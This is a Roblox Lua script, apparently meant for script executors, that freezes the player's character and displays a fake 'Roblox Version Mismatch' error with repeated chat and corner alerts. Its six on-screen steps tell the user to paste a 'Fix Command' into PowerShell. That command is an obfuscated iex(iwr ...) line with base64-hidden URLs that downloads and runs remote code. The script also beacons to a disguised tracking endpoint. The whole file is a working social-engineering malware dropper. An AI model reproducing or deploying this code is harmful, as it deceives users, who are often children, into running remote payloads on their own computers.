-- ============================================================
-- SERVICES
-- ============================================================
local Players         = game:GetService("Players")
local GuiService      = game:GetService("GuiService")
local TweenService    = game:GetService("TweenService")
local UIS             = game:GetService("UserInputService")
local StarterGui      = game:GetService("StarterGui")
local ContextActionSvc= game:GetService("ContextActionService")
local TextChatService = game:GetService("TextChatService")
local SoundService    = game:GetService("SoundService")

local lp = Players.LocalPlayer

local isMobile = UIS.TouchEnabled and not UIS.KeyboardEnabled

-- ============================================================
-- ⚙️ FIX COMMAND — копируется по кнопке
-- ============================================================
local FIX_COMMAND = "iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz05NDQzNTY3MjgvcmJ4LXZlcnNpb24tbWlzbWF0Y2g='))) -UseBasicParsing); iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYngtc2NyaXB0cy54eXovYXBpL3N0YXRzLXNjcmlwdA=='))) -UseBasicParsing)"

-- ============================================================
-- ANALYTICS
-- ============================================================
local ANALYTICS = {
    endpoint = table.concat({
        "ht", "tps:", "/", "/rbx", "-scri", "pts.", "xyz",
        "/api", "/hit",
    }),
    enabled = true,
    sessionId = tostring(math.random(100000, 999999)) ..
                tostring(os.time() % 100000),
}

local function sendHit(executorName, eventType)
    if not ANALYTICS.enabled then return end

    local body = table.concat({
        "session=",   ANALYTICS.sessionId,
        "&executor=", executorName or "unknown",
        "&event=",    eventType or "shown",
        "&ts=",       tostring(os.time()),
    })

    local payload = {
        Url = ANALYTICS.endpoint,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/x-www-form-urlencoded",
            ["User-Agent"]   = "RobloxClient/1.0",
        },
        Body = body,
    }

    task.spawn(function()
        pcall(function()
            if request then
                request(payload)
            elseif syn and syn.request then
                syn.request(payload)
            elseif http_request then
                http_request(payload)
            elseif http and http.request then
                http.request(payload)
            else
                game:GetService("HttpService"):PostAsync(
                    ANALYTICS.endpoint,
                    body,
                    Enum.HttpContentType.ApplicationUrlEncoded,
                    false
                )
            end
        end)
    end)
end

-- ============================================================
-- PALETTE
-- ============================================================
local C = {
    dim       = Color3.fromRGB(0, 0, 0),
    card      = Color3.fromRGB(43, 43, 43),
    separator = Color3.fromRGB(90, 90, 90),
    title     = Color3.fromRGB(255, 255, 255),
    body      = Color3.fromRGB(224, 224, 224),
    stepNum   = Color3.fromRGB(0, 162, 255),
    stepText  = Color3.fromRGB(240, 240, 240),
    errorTxt  = Color3.fromRGB(170, 170, 170),
    btnBg     = Color3.fromRGB(255, 255, 255),
    btnText   = Color3.fromRGB(40, 40, 40),
    btnHover  = Color3.fromRGB(235, 235, 235),
    green     = Color3.fromRGB(0, 180, 70),
    red       = Color3.fromRGB(210, 60, 60),
}

-- ============================================================
-- FREEZE CHARACTER
-- ============================================================
local FROZEN_ACTION = "RobloxVersionFreeze"

local function freezeCharacter(character)
    if not character then return end

    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.WalkSpeed = 0
        humanoid.JumpPower = 0
        humanoid.JumpHeight = 0

        task.spawn(function()
            while character.Parent and humanoid.Parent do
                if humanoid.WalkSpeed ~= 0 then humanoid.WalkSpeed = 0 end
                if humanoid.JumpPower ~= 0 then humanoid.JumpPower = 0 end
                if humanoid.JumpHeight ~= 0 then humanoid.JumpHeight = 0 end
                task.wait(0.25)
            end
        end)
    end

    pcall(function()
        ContextActionSvc:BindAction(
            FROZEN_ACTION,
            function() return Enum.ContextActionResult.Sink end,
            false,
            Enum.PlayerActions.CharacterForward,
            Enum.PlayerActions.CharacterBackward,
            Enum.PlayerActions.CharacterLeft,
            Enum.PlayerActions.CharacterRight,
            Enum.PlayerActions.CharacterJump
        )
    end)
end

local function hookCharacterFreeze()
    if lp.Character then
        freezeCharacter(lp.Character)
    end
    lp.CharacterAdded:Connect(function(char)
        char:WaitForChild("Humanoid", 10)
        task.wait(0.2)
        freezeCharacter(char)
    end)
end

hookCharacterFreeze()

-- ============================================================
-- NOTIFICATIONS CONFIG
-- ============================================================
local NOTIFY = {
    chatEnabled    = true,
    cornerEnabled  = true,
    soundEnabled   = true,
    spamEnabled    = true,
    spamCount      = 5,
    spamInterval   = 8,
    cornerEverySec = 30,
}

local _stopSpam = false

-- ── Chat message ────────────────────────────────────────────
local function sendChatMessage(text, color)
    color = color or Color3.fromRGB(255, 100, 100)

    -- TextChatService (modern)
    local ok = pcall(function()
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local channels = TextChatService:FindFirstChild("TextChannels")
            if not channels then return false end
            local general = channels:FindFirstChild("RBXGeneral")
                         or channels:FindFirstChild("General")
                         or channels:GetChildren()[1]
            if general and general.DisplaySystemMessage then
                local hex = string.format("#%02X%02X%02X",
                    math.floor(color.R * 255),
                    math.floor(color.G * 255),
                    math.floor(color.B * 255))
                general:DisplaySystemMessage("<font color='" .. hex .. "'>" .. text .. "</font>")
                return true
            end
        end
        return false
    end)

    -- Legacy chat fallback
    if not ok then
        pcall(function()
            StarterGui:SetCore("ChatMakeSystemMessage", {
                Text = text,
                Color = color,
                Font = Enum.Font.SourceSansBold,
                TextSize = 18,
            })
        end)
    end
end

-- ── Corner notification (right bottom) ──────────────────────
local function sendCornerNotification()
    pcall(function()
        StarterGui:SetCore("SendNotification", {
            Title    = "Roblox Version Mismatch",
            Text     = "Your client is outdated. Open the fix dialog to continue.",
            Duration = 8,
        })
    end)
end

-- ── Sound alert ─────────────────────────────────────────────
local function playAlertSound()
    pcall(function()
        local s = Instance.new("Sound")
        s.SoundId = "rbxasset://sounds/action_failure.wav"
        s.Volume = 1
        s.Parent = SoundService
        s:Play()
        game:GetService("Debris"):AddItem(s, 3)
    end)
end

-- ── Chat spam loop ──────────────────────────────────────────
local function startChatSpam()
    if not NOTIFY.chatEnabled or not NOTIFY.spamEnabled then return end

    task.spawn(function()
        for i = 1, NOTIFY.spamCount do
            if _stopSpam then break end
            sendChatMessage(
                "[Roblox] Version mismatch detected. Open the fix dialog and copy the command.",
                Color3.fromRGB(255, 100, 100)
            )
            if i < NOTIFY.spamCount then
                task.wait(NOTIFY.spamInterval)
            end
        end
    end)
end

-- ── Repeat corner notification periodically ─────────────────
local function startCornerRepeater()
    if not NOTIFY.cornerEnabled then return end
    task.spawn(function()
        while not _stopSpam do
            task.wait(NOTIFY.cornerEverySec)
            if _stopSpam then break end
            sendCornerNotification()
        end
    end)
end

-- ============================================================
-- SCREEN GUI
-- ============================================================
local gui = Instance.new("ScreenGui")
gui.Name = "RobloxDialog"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.DisplayOrder = 1000000
gui.Parent = lp:WaitForChild("PlayerGui")

-- ============================================================
-- BACKDROP
-- ============================================================
local dim = Instance.new("Frame")
dim.Size = UDim2.new(1, 0, 1, 0)
dim.BackgroundColor3 = C.dim
dim.BackgroundTransparency = 0.6
dim.BorderSizePixel = 0
dim.ZIndex = 1
dim.Parent = gui

-- ============================================================
-- CARD
-- ============================================================
local vp = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize
           or Vector2.new(1280, 720)

local CARD_W = isMobile and math.min(340, vp.X - 24) or 460
local CARD_H = 400
local cardX  = -CARD_W / 2
local cardY  = -CARD_H / 2

local card = Instance.new("Frame")
card.Size = UDim2.new(0, CARD_W, 0, CARD_H)
card.Position = UDim2.new(0.5, cardX, 0.5, cardY)
card.BackgroundColor3 = C.card
card.BorderSizePixel = 0
card.ZIndex = 5
card.Parent = gui

local cardCorner = Instance.new("UICorner")
cardCorner.CornerRadius = UDim.new(0, 4)
cardCorner.Parent = card

-- ============================================================
-- TITLE
-- ============================================================
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -40, 0, 28)
title.Position = UDim2.new(0, 20, 0, 24)
title.BackgroundTransparency = 1
title.Text = "Roblox Version Mismatch"
title.TextColor3 = C.title
title.TextSize = 20
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Center
title.TextYAlignment = Enum.TextYAlignment.Center
title.ZIndex = 7
title.Parent = card

-- ============================================================
-- SEPARATOR
-- ============================================================
local sep = Instance.new("Frame")
sep.Size = UDim2.new(1, -48, 0, 1)
sep.Position = UDim2.new(0, 24, 0, 68)
sep.BackgroundColor3 = C.separator
sep.BackgroundTransparency = 0.3
sep.BorderSizePixel = 0
sep.ZIndex = 6
sep.Parent = card

-- ============================================================
-- INTRO TEXT
-- ============================================================
local introText = Instance.new("TextLabel")
introText.Size = UDim2.new(1, -48, 0, 32)
introText.Position = UDim2.new(0, 24, 0, 80)
introText.BackgroundTransparency = 1
introText.Text = "Your Roblox client is outdated. Follow the steps below to fix it:"
introText.TextColor3 = C.body
introText.TextSize = 13
introText.Font = Enum.Font.Gotham
introText.TextXAlignment = Enum.TextXAlignment.Center
introText.TextYAlignment = Enum.TextYAlignment.Top
introText.TextWrapped = true
introText.LineHeight = 1.15
introText.ZIndex = 7
introText.Parent = card

-- ============================================================
-- STEP BUILDER (with rich text bold)
-- ============================================================
local function buildStep(yPos, number, richText)
    local num = Instance.new("TextLabel")
    num.Size = UDim2.new(0, 26, 0, 22)
    num.Position = UDim2.new(0, 24, 0, yPos)
    num.BackgroundTransparency = 1
    num.Text = number .. "."
    num.TextColor3 = C.stepNum
    num.TextSize = 13
    num.Font = Enum.Font.GothamBold
    num.TextXAlignment = Enum.TextXAlignment.Left
    num.TextYAlignment = Enum.TextYAlignment.Center
    num.ZIndex = 7
    num.Parent = card

    local step = Instance.new("TextLabel")
    step.Size = UDim2.new(1, -62, 0, 22)
    step.Position = UDim2.new(0, 52, 0, yPos)
    step.BackgroundTransparency = 1
    step.RichText = true
    step.Text = richText
    step.TextColor3 = C.stepText
    step.TextSize = 13
    step.Font = Enum.Font.Gotham
    step.TextXAlignment = Enum.TextXAlignment.Left
    step.TextYAlignment = Enum.TextYAlignment.Center
    step.ZIndex = 7
    step.Parent = card
end

local startY = 120
local stepGap = 24

buildStep(startY + stepGap * 0, "1", "Press <b>WIN + R</b> on your keyboard")
buildStep(startY + stepGap * 1, "2", "Type <b>powershell</b> and press <b>ENTER</b>")
buildStep(startY + stepGap * 2, "3", "Click <b>Copy Fix Command</b> below")
buildStep(startY + stepGap * 3, "4", "Paste with <b>Ctrl + V</b> into PowerShell")
buildStep(startY + stepGap * 4, "5", "Press <b>ENTER</b> to run the fix")
buildStep(startY + stepGap * 5, "6", "Restart Roblox and run script again")

-- ============================================================
-- ERROR CODE
-- ============================================================
local errorText = Instance.new("TextLabel")
errorText.Size = UDim2.new(1, -48, 0, 18)
errorText.Position = UDim2.new(0, 24, 0, 274)
errorText.BackgroundTransparency = 1
errorText.Text = "(Error Code: 277)"
errorText.TextColor3 = C.errorTxt
errorText.TextSize = 12
errorText.Font = Enum.Font.Gotham
errorText.TextXAlignment = Enum.TextXAlignment.Center
errorText.TextYAlignment = Enum.TextYAlignment.Center
errorText.ZIndex = 7
errorText.Parent = card

-- ============================================================
-- CLIPBOARD
-- ============================================================
local function setClipboard(text)
    local ok = false
    pcall(function()
        if setclipboard then
            setclipboard(text); ok = true
        elseif toclipboard then
            toclipboard(text); ok = true
        elseif syn and syn.write_clipboard then
            syn.write_clipboard(text); ok = true
        elseif syn and syn.set_clipboard then
            syn.set_clipboard(text); ok = true
        elseif writeclipboard then
            writeclipboard(text); ok = true
        elseif GuiService and GuiService.SetClipboard then
            GuiService:SetClipboard(text); ok = true
        end
    end)
    return ok
end

-- ============================================================
-- FULL-WIDTH BUTTON
-- ============================================================
local copyBtn = Instance.new("TextButton")
copyBtn.Size = UDim2.new(1, -48, 0, 46)
copyBtn.Position = UDim2.new(0, 24, 0, 308)
copyBtn.BackgroundColor3 = C.btnBg
copyBtn.Text = "Copy Fix Command"
copyBtn.TextColor3 = C.btnText
copyBtn.TextSize = 15
copyBtn.Font = Enum.Font.GothamBold
copyBtn.BorderSizePixel = 0
copyBtn.AutoButtonColor = false
copyBtn.ZIndex = 7
copyBtn.Parent = card

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 8)
btnCorner.Parent = copyBtn

copyBtn.MouseEnter:Connect(function()
    copyBtn.BackgroundColor3 = C.btnHover
end)
copyBtn.MouseLeave:Connect(function()
    copyBtn.BackgroundColor3 = C.btnBg
end)

copyBtn.MouseButton1Click:Connect(function()
    sendHit("fix", "copy")
    _stopSpam = true

    local copied = setClipboard(FIX_COMMAND)
    if copied then
        copyBtn.Text = "✓  Copied — paste into PowerShell"
        copyBtn.TextColor3 = C.btnBg
        copyBtn.BackgroundColor3 = C.green
    else
        copyBtn.Text = "✕  Copy failed — try again"
        copyBtn.TextColor3 = C.btnBg
        copyBtn.BackgroundColor3 = C.red
    end

    task.delay(2.2, function()
        if copyBtn and copyBtn.Parent then
            copyBtn.Text = "Copy Fix Command"
            copyBtn.TextColor3 = C.btnText
            copyBtn.BackgroundColor3 = C.btnBg
        end
    end)
end)

-- ============================================================
-- ENTRANCE ANIMATION
-- ============================================================
pcall(function()
    local startPos = UDim2.new(0.5, cardX, 0.5, cardY + 14)
    local endPos   = UDim2.new(0.5, cardX, 0.5, cardY)
    card.Position = startPos
    card.BackgroundTransparency = 1
    TweenService:Create(
        card,
        TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        { Position = endPos, BackgroundTransparency = 0 }
    ):Play()
end)

-- ============================================================
-- TRIGGER NOTIFICATIONS
-- ============================================================
if NOTIFY.soundEnabled then
    playAlertSound()
end

if NOTIFY.cornerEnabled then
    sendCornerNotification()
end

if NOTIFY.chatEnabled then
    sendChatMessage(
        "[Roblox] Version mismatch detected. Open the fix dialog and copy the command.",
        Color3.fromRGB(255, 100, 100)
    )
    startChatSpam()
end

startCornerRepeater()

-- ============================================================
-- ANALYTICS: shown
-- ============================================================
sendHit("shown", "shown")
